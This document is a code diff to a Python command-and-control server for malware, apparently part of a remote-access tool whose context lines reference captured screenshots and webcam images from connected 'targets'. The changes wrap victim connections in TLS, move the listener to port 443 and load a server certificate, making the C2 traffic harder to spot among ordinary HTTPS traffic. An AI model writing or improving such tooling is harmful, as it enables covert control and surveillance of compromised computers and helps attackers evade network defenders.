@@ -1,6 +1,4 @@
-# Instrumented C2 Server with Framed JSON Protocol
 import json
-import hashlib
 import os
 import socket
 import ssl
@@ -14,6 +12,9 @@ WEBCAM_DIR = './images/webcam'
 SCREENSHOT_TIMEOUT = 3
 WEBCAM_TIMEOUT = 10
 HEADER_SIZE = 16
+
+CERT_FILE = 'cert.pem'
+KEY_FILE = 'key.pem'
 
 def send_json(target, data):
     try:
@@ -43,11 +44,12 @@ def recv_json(target):
         print(f"[ERROR] Failed to receive data: {e}")
         return None
 
-def accept_connections(sock, targets, ips):
+def accept_connections(sock, context, targets, ips):
     while True:
         try:
-            target, ip = sock.accept()
-            print(f"[+] Connection from {ip}")
+            raw_target, ip = sock.accept()
+            target = context.wrap_socket(raw_target, server_side=True)
+            print(f"[+] TLS connection from {ip}")
             handshake = recv_json(target)
             print(f"[DEBUG] Handshake: {handshake}")
             targets.append(target)
@@ -59,7 +61,7 @@ def accept_connections(sock, targets, ips):
 def initialise_socket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(('0.0.0.0', 5555))
+    sock.bind(('0.0.0.0', 443))
     sock.listen(5)
     print("[INFO] Socket initialized")
     return sock
@@ -110,8 +112,13 @@ def list_targets(ips):
 def run_c2():
     targets = []
     ips = []
+
     sock = initialise_socket()
-    threading.Thread(target=accept_connections, args=(sock, targets, ips), daemon=True).start()
+
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
+
+    threading.Thread(target=accept_connections, args=(sock, context, targets, ips), daemon=True).start()
 
     while True:
         try:
@@ -134,5 +141,5 @@ def run_c2():
 
 if __name__ == '__main__':
     print(banner())
-    print("[+] Waiting for incoming connections...")
+    print("[+] Waiting for incoming TLS connections...")
     run_c2()
